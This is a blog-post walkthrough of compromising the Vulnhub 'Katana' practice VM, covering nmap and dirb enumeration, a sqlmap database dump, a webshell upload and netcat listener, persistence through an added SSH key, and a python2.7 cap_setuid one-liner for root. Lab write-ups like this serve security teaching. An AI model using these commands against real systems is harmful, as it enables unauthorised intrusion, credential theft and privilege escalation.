@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>crazyeights225</title>
+   
+    <link rel="stylesheet" href="../assets/bulma.min.css">
+    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="../assets/js/navbar.js"></script><style>
+      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
+    </style>
+  </head>
+  <body>
+    <div id="app" class="mt-2">
+        <nav class="navbar container" role="navigation" aria-label="main navigation">
+            <div class="navbar-brand">
+              <a class="navbar-item" href="/">
+                <img src="../assets/logo.png">
+              </a>
+              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbar">
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+                <span aria-hidden="true"></span>
+              </a>
+            </div>
+            <div id="navbar" class="navbar-menu">
+              <div class="navbar-start">
+                    <a href="../index.html" class="navbar-item">Posts</a>
+                    <a href="../projects.html" class="navbar-item">Projects</a>
+              </div>
+            </div>
+          </nav>
+    </div>
+    <div class="hero-body mt-2" style="background-color: #285aff;">
+        <div class="container has-text-centered">
+            <h1 class="title" style="color: #f1f1f1;">
+                Vulnhub: Katana
+            </h1>
+            <h2 class="subtitle" style="color: #f1f1f1;">
+                Jan, 2021
+            </h2>
+        </div>
+    </div>
+<section class="section mt-2">
+  <div class="container">
+  <div class="columns">
+  <div class="content column is-10">
+    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
+        <ul>
+          <li><a href="../index.html">Posts</a></li>
+          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
+          <li class="is-active"><a href="#" aria-current="page">Katana</a></li>
+        </ul>
+      </nav>
+
+<h2>Scanning:</h2><p >Finding the machine on the network</p><pre><code><span>crazyeights@es-base:~$ nmap -PS 192.168.0.1-255
+
+Nmap scan report for 192.168.0.207
+Host is up (0.00028s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8088/tcp open  radan-http</span></code></pre><p >
+</p><p >Finding more details about the services running on the machine:</p><pre id="caa7354e-6842-4644-81c4-c76d71db56a8" class="code code-wrap"><code><span>crazyeights@es-base:~$ nmap -A -p- 192.168.0.207
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+7080/tcp open  ssl/http    LiteSpeed httpd
+8088/tcp open  http        LiteSpeed httpd
+8715/tcp open  http        nginx 1.14.2
+
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: katana
+|   NetBIOS computer name: KATANA\x00
+|   Domain name: \x00
+|   FQDN: katana</span></code></pre><p >
+</p><h2 >Port 80</h2><p >Index Page:</p><figure id="a72216de-c888-405f-9ef3-c9f2f4848920" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_21-00-28.png"><img style="width:1202px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_21-00-28.png"/></a></figure><p >Enumerating to look for more files and folders:</p><pre id="952cf481-6e98-4299-8871-5478bc316051" class="code code-wrap"><code><span>crazyeights@es-base:~$ dirb http://192.168.0.207
+
+==> DIRECTORY: http://192.168.0.207/ebook/                                     
++ http://192.168.0.207/index.html (CODE:200|SIZE:655)                          
++ http://192.168.0.207/server-status (CODE:403|SIZE:278)                       
+                                                                               
+---- Entering directory: http://192.168.0.207/ebook/ ----
+[SNIP]</span></code></pre><p >
+</p><h3 >The Bookstore:</h3><figure id="7d41b5c7-c3dc-4e94-a1cf-b32dac1024ae" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_21-03-24.png"><img style="width:1202px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_21-03-24.png"/></a></figure><p >
+</p><p >I have worked with the application before in another box. I know  that the bookisbn parameter on the book page is vulnerable to sql injection, and the create/add book section is vulnerable to arbitrary file upload, which leads to remote code execution.</p><p >Unfortunately the ability to upload files for book covers has been stripped from the application so there is not much we can do.</p><p >
+</p><p >We can exploit the sql injection vulnerability but there is nothing in the database that is helpful.</p><pre id="f0731518-3ac8-4d0b-892d-266d6cf7ced1" class="code code-wrap"><code><span>crazyeights@es-base:~$ sqlmap -u http://192.168.0.207/ebook/book.php?bookisbn=978-0-321-94786-4 --dump
+                                         
+Database: ebook                                                                                                                        
+Table: admin
+[1 entry]
++-------+--------------------------------------------------+
+| name  | pass                                             |
++-------+--------------------------------------------------+
+| admin | d033e22ae348aeb5660fc2140aec35850c4da997 (admin) |
++-------+--------------------------------------------------+
+[SNIP]</span></code></pre><p >
+</p><p >Moving on to another service is the best next step.</p><h2 >Port 139, 445</h2><p >
+</p><p >Using enum4linux we find the username of local user katana</p><pre id="1e5a350d-e7ab-4ae4-adf9-94ed18efc6c8" class="code code-wrap"><code>S-1-22-1-1000 Unix User\katana (Local User)</code></pre><p >
+</p><p >There is nothing else here. Moving on to the next service.</p><h2 >Port 8088</h2><p >This service also had the katana index page. </p><p >When we enumerate we find several helpful pages.</p><pre id="7c1858c9-9047-4c48-88c3-22477f18b526" class="code code-wrap"><code><span>crazyeights@es-base:~$ dirb http://192.168.0.207:8088 -X .html,.php,.txt
+
+---- Scanning URL: http://192.168.0.207:8088/ ----
++ http://192.168.0.207:8088/error404.html (CODE:200|SIZE:195)                  
++ http://192.168.0.207:8088/index.html (CODE:200|SIZE:655)                     
++ http://192.168.0.207:8088/phpinfo.php (CODE:200|SIZE:50761)                  
++ http://192.168.0.207:8088/upload.html (CODE:200|SIZE:6480)                   
++ http://192.168.0.207:8088/upload.php (CODE:200|SIZE:1800)           
+</span></code></pre><p >
+</p><p >On the upload.php page we see the following:</p><figure id="92f7d97e-a0ba-4459-b58d-62334dcd46ff" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-05-35.png"><img style="width:803px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-05-35.png"/></a></figure><p >
+</p><p >On the upload.html page we see a file upload form, meaning that we can likely upload a reverse shell:</p><figure id="89b18537-2e3d-48b0-b61c-700b751cff6e" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-05-45.png"><img style="width:1223px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-05-45.png"/></a></figure><p >
+</p><p >I kinda got a bit lost when I did this, I was convinced it wasn&#x27;t working because I kept getting an error message when I tried a reverse shell, so I uploaded a webshell instead. It would with a reverse shell though, saving a step.</p><figure id="0ad464fd-184c-4895-8960-71bd004c7373" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-16-46.png"><img style="width:878px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-16-46.png"/></a></figure><p >
+</p><p >The next step is to find the location of the reverse shell on the four web servers on ports 80, 7080, 8088, and 8715, because the location /opt/manager/html could be a different web service.</p><p >
+</p><p >I checked for katana_ws.php file on each of them one at a time until I found it on port 8715:</p><figure id="82919562-e586-4b7c-af18-e970796fe15a" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-18-16.png"><img style="width:1135px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-18-16.png"/></a></figure><p >Start the listener:</p><pre id="a21d6775-ede6-4e49-84e9-643e7372e6ab" class="code code-wrap"><code>nc -lvp 1234</code></pre><p >Use the web shell to spawn a reverse shell to get access to the machine:</p><figure id="e69c1baf-985e-4710-b449-a3901a6edd1e" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-21-27.png"><img style="width:1064px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-21-27.png"/></a></figure><p >
+</p><h2 >User</h2><p >For the user katana we can find their password in a hidden file in their home directory:</p><figure id="1d7a7115-2b36-4ff0-a7a6-246539df2d65" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-21-51.png"><img style="width:714px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-21-51.png"/></a></figure><p >We can now login as katana:</p><figure id="6a4822de-d991-4ed2-8d7b-c89ae122922a" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-23-40.png"><img style="width:649px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-23-40.png"/></a></figure><p >
+</p><p >Add our public key to katana&#x27;s authorized_keys to login via SSH for a nicer shell:</p><figure id="8c2e41ff-cdf6-4476-afdc-7be035a4e482" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-24-33.png"><img style="width:660px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-24-33.png"/></a></figure><p >
+</p><figure id="8eb6483c-3238-4b4f-a56c-e9c82f4af6f3" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-24-34.png"><img style="width:643px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-24-34.png"/></a></figure><p >
+</p><p >This took me a long time to find out. We must use the capabilities configuration for privilege escalation. Capabilities allows for a root user to assign other users root privileges only for specific tasks. </p><p >The file capabilities.conf was not in the default location (/etc/security), and the tool getcap was not on the PATH.</p><pre id="15a03998-551b-4528-b609-db28ac5c8a1c" class="code code-wrap"><code><span>katana@katana:~$ /usr/sbin/getcap -r / 2>/dev/null 
+/usr/bin/ping = cap_net_raw+ep 
+/usr/bin/python2.7 = cap_setuid+ep</span></code></pre><p >
+</p><p >cap_setuid allows the changing of the UID, so we can use python2.7 to get root by spawning a root shell with euid set to 0.</p><pre id="b02c3321-60af-4498-bac6-21e001ec08de" class="code code-wrap"><code><span>/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'</span></code></pre><figure id="ef6bf496-2de0-47fa-9120-43ae91a51478" class="image"><a href="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-59-26.png"><img style="width:1061px" src="Katana%20a72216dec888405f9ef3c9f2f4848920/Screenshot_from_2021-01-15_22-59-26.png"/></a></figure><p >
+</p><p>FIN. 🥳</p>
+</div>
+</div></div></section><footer class="footer">
+    <div class="container">
+        <div class="columns">
+        </div>
+    </div>
+</footer>
+</body>
+</html>
